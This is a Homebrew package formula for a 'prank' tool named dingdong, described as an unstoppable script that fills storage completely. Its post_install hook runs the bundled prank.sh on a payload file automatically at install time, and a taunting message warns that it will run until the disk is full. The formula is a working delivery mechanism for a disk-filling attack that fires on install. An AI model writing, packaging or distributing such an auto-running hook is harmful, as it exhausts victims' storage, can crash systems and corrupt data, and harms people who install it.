class Dingdong < Formula
  desc "An unstoppable prank script that fills storage completely"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "2.1.0"
  sha256 "bd3b20d61665b581a0f6550fc530052a8f9ac2f502df99b7385de56e4c64be10"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "⚠️  WARNING: This will run until disk is full! hahaha hahaha got ya 👺 "
    system "#{bin}/prank.sh #{pkgshare}/payload.png"
  end
end
